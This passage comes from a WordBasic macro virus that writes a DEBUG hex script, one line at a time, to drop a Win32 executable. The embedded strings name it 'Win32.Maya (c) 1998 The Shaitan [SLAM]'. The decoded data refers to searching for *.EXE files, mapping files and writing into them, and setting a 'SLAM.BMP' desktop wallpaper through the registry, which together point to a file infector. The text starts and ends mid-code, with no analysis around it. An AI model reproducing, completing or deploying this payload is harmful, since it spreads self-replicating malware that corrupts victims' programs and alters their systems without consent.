"e 0d50 00 74 22 b8 d8 18 40 00 03 c5 e8 7d fe ff ff 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d60 f8 00 74 11 e8 0d 00 00 00 b8 58 19 40 00 03 c5 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d70 e8 67 fe ff ff c3 55 b8 e8 19 40 00 03 c5 50 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d80 2a 1b 40 00 03 c5 50 8b 85 63 1c 40 00 ff d0 5d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0d90 83 f8 ff 74 6d 89 85 26 1b 40 00 ba 14 1a 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0da0 03 d5 e8 4c fb ff ff 83 bd 34 1b 40 00 01 75 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0db0 ff 85 38 1b 40 00 83 bd 38 1b 40 00 05 74 43 55 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dc0 b8 e8 19 40 00 03 c5 50 ff b5 26 1b 40 00 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0dd0 79 1c 40 00 ff d0 5d 83 f8 00 74 26 ba 14 1a 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0de0 00 03 d5 e8 0b fb ff ff 83 bd 34 1b 40 00 01 75 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0df0 ce ff 85 38 1b 40 00 83 bd 38 1b 40 00 05 74 02 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e00 eb bd c3 e8 f1 fd ff ff 66 83 bd de 19 40 00 01 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e10 0f 85 b9 01 00 00 b8 b8 1e 40 00 03 c5 e8 ea fd " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e20 ff ff 83 f8 00 0f 84 a4 01 00 00 89 85 d0 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e30 00 b8 c3 1e 40 00 03 c5 e8 cf fd ff ff 83 f8 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e40 0f 84 89 01 00 00 89 85 d4 1e 40 00 ba dc 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e50 00 03 d5 8b 85 d4 1e 40 00 e8 ba fd ff ff 83 f8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e60 00 0f 84 68 01 00 00 89 85 1b 1f 40 00 ba ea 1e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e70 40 00 03 d5 8b 85 d4 1e 40 00 e8 99 fd ff ff 83 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e80 f8 00 0f 84 47 01 00 00 89 85 1f 1f 40 00 ba f9 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0e90 1e 40 00 03 d5 8b 85 d0 1e 40 00 e8 78 fd ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ea0 83 f8 00 0f 84 26 01 00 00 89 85 23 1f 40 00 ba " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0eb0 05 1f 40 00 03 d5 8b 85 d0 1e 40 00 e8 57 fd ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ec0 ff 83 f8 00 0f 84 05 01 00 00 89 85 27 1f 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ed0 6a 00 68 80 00 00 00 6a 02 6a 00 6a 01 68 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ee0 00 40 b8 73 1e 40 00 03 c5 50 8b 85 c9 1b 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ef0 ff d0 83 f8 ff 0f 84 d4 00 00 00 89 85 7c 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f00 00 6a 00 b8 80 1e 40 00 03 c5 50 68 e6 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f10 b8 2b 1f 40 00 03 c5 50 ff b5 7c 1e 40 00 8b 85 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f20 db 1b 40 00 ff d0 ff b5 7c 1e 40 00 8b 85 4c 1c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f30 40 00 ff d0 b8 4e 1e 40 00 03 c5 50 6a 02 6a 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f40 b8 38 1e 40 00 03 c5 50 68 01 00 00 80 8b 85 1b " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f50 1f 40 00 ff d0 6a 02 b8 52 1e 40 00 03 c5 50 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f60 01 6a 00 b8 56 1e 40 00 03 c5 50 ff b5 4e 1e 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f70 00 8b 85 1f 1f 40 00 ff d0 6a 02 b8 54 1e 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f80 03 c5 50 6a 01 6a 00 b8 64 1e 40 00 03 c5 50 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0f90 b5 4e 1e 40 00 8b 85 1f 1f 40 00 ff d0 6a 00 b8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fa0 73 1e 40 00 03 c5 50 6a 00 6a 14 8b 85 27 1f 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fb0 00 ff d0 6a 30 b8 ab 1e 40 00 03 c5 50 b8 84 1e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fc0 40 00 03 c5 50 6a 00 8b 85 23 1f 40 00 ff d0 c3 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fd0 00 00 f7 bf 00 00 40 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0fe0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ff0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 10f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1110 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 11f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1220 00 00 00 00 00 00 00 00 00 00 2a 2e 45 58 45 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1260 00 00 00 00 00 00 00 00 00 00 00 00 11 20 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1270 00 00 00 00 00 00 00 00 00 00 00 00 4b 45 52 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1280 45 4c 33 32 2e 64 6c 6c 00 11 00 00 00 47 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1290 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12a0 00 00 0f 00 00 00 47 65 74 50 72 6f 63 41 64 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12b0 72 65 73 73 00 00 00 00 00 0c 00 00 00 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12c0 61 74 65 46 69 6c 65 41 00 00 00 00 00 0a 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12d0 00 57 72 69 74 65 46 69 6c 65 00 00 00 00 00 0c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12e0 00 00 00 47 65 74 46 69 6c 65 53 69 7a 65 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 12f0 00 00 00 13 00 00 00 43 72 65 61 74 65 46 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1300 65 4d 61 70 70 69 6e 67 41 00 00 00 00 00 0e 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1310 00 00 4d 61 70 56 69 65 77 4f 66 46 69 6c 65 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1320 00 00 00 00 10 00 00 00 55 6e 6d 61 70 56 69 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1330 77 4f 66 46 69 6c 65 00 00 00 00 00 0c 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1340 43 6c 6f 73 65 48 61 6e 64 6c 65 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1350 0f 00 00 00 46 69 6e 64 46 69 72 73 74 46 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1360 65 41 00 00 00 00 00 0e 00 00 00 46 69 6e 64 4e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1370 65 78 74 46 69 6c 65 41 00 00 00 00 00 0a 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1380 00 46 69 6e 64 43 6c 6f 73 65 00 00 00 00 00 0f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1390 00 00 00 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13a0 72 00 00 00 00 00 0d 00 00 00 53 65 74 45 6e 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13b0 4f 66 46 69 6c 65 00 00 00 00 00 15 00 00 00 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13c0 65 74 43 75 72 72 65 6e 74 44 69 72 65 63 74 6f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13d0 72 79 41 00 00 00 00 00 15 00 00 00 53 65 74 43 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13e0 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 13f0 00 00 00 00 00 13 00 00 00 47 65 74 46 69 6c 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1400 41 74 74 72 69 62 75 74 65 73 41 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1410 13 00 00 00 53 65 74 46 69 6c 65 41 74 74 72 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1420 62 75 74 65 73 41 00 00 00 00 00 0e 00 00 00 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1430 65 74 53 79 73 74 65 6d 54 69 6d 65 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1440 00 15 00 00 00 47 65 74 57 69 6e 64 6f 77 73 44 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1450 69 72 65 63 74 6f 72 79 41 00 00 00 00 00 41 59 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1460 41 4d 0a 00 00 00 4d 6f 76 65 46 69 6c 65 41 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1470 00 00 00 00 a0 15 40 00 0a 00 00 00 43 6f 70 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1480 46 69 6c 65 41 00 00 00 00 00 ab 15 40 00 0c 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1490 00 00 43 72 65 61 74 65 46 69 6c 65 41 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14a0 00 00 b6 15 40 00 0c 00 00 00 44 65 6c 65 74 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14b0 46 69 6c 65 41 00 00 00 00 00 c1 15 40 00 13 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14c0 00 00 53 65 74 46 69 6c 65 41 74 74 72 69 62 75 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14d0 74 65 73 41 00 00 00 00 00 cc 15 40 00 13 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14e0 00 47 65 74 46 69 6c 65 41 74 74 72 69 62 75 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 14f0 65 73 41 00 00 00 00 00 d7 15 40 00 11 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1500 47 65 74 46 75 6c 6c 50 61 74 68 4e 61 6d 65 41 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1510 00 00 00 00 00 e2 15 40 00 0f 00 00 00 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1520 61 74 65 50 72 6f 63 65 73 73 41 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1530 ed 15 40 00 49 41 48 53 43 6f 6e 74 72 6f 6c 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1540 50 61 6e 65 6c 5c 44 65 73 6b 74 6f 70 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1550 00 00 31 00 30 00 54 69 6c 65 57 61 6c 6c 70 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1560 70 65 72 00 57 61 6c 6c 70 61 70 65 72 53 74 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1570 6c 65 00 53 4c 41 4d 2e 42 4d 50 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1580 00 00 00 00 57 69 6e 33 32 2e 4d 61 79 61 20 28 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1590 63 29 20 31 39 39 38 20 54 68 65 20 53 68 61 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15a0 74 61 6e 20 5b 53 4c 41 4d 5d 00 56 69 72 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15b0 20 41 6c 65 72 74 21 00 55 53 45 52 33 32 2e 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15c0 6c 6c 00 41 44 56 41 50 49 33 32 2e 64 6c 6c 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15d0 00 00 00 00 00 00 00 00 00 00 00 00 52 65 67 4f " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15e0 70 65 6e 4b 65 79 45 78 41 00 52 65 67 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 15f0 56 61 6c 75 65 45 78 41 00 4d 65 73 73 61 67 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1600 42 6f 78 41 00 53 79 73 74 65 6d 50 61 72 61 6d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1610 65 74 65 72 73 49 6e 66 6f 41 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1620 00 00 00 00 00 00 00 00 00 00 00 42 4d e6 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1630 00 00 00 00 00 3e 00 00 00 28 00 00 00 3c 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1640 00 15 00 00 00 01 00 01 00 00 00 00 00 a8 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1650 00 c4 0e 00 00 c4 0e 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1660 00 00 00 00 00 ff ff ff 00 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1670 f0 ff ff ff ff ff ff ff f0 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1680 f0 ff ff ff ff ff ff ff f0 e0 02 00 83 e2 0e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1690 70 e0 02 00 83 e2 0e 3c 70 e3 82 0f 83 e2 0e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16a0 70 e3 82 0f 83 e2 0e 3c 70 e3 82 0f 80 02 0e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16b0 70 ff 82 0f 80 02 0e 3c 70 e0 02 1f c3 86 1e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16c0 70 e0 02 3f e3 8e 3e 3c 70 e3 fe 3f e3 8e 3e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16d0 70 e3 e2 3f e3 8e 3e 3c 70 e3 e2 3f e3 8e 3e 3c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16e0 70 e3 e2 3f e3 8e 3e 3c 70 e0 02 3f e0 0e 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 16f0 70 e0 02 3f e0 0e 00 00 70 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1700 f0 ff ff ff ff ff ff ff f0 ff ff ff ff ff ff ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1710 f0 6a 30 68 2b 20 40 00 68 38 20 40 00 6a 00 e8 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1720 47 00 00 00 6a 00 e8 3a 00 00 00 56 69 72 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1730 20 41 6c 65 72 74 21 00 57 69 6e 33 32 2e 4d 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1740 79 61 20 28 63 29 20 31 39 39 38 20 54 68 65 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1750 53 68 61 69 74 61 6e 20 5b 53 4c 41 4d 5d 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1760 25 50 40 40 00 ff 25 54 40 40 00 ff 25 5c 40 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
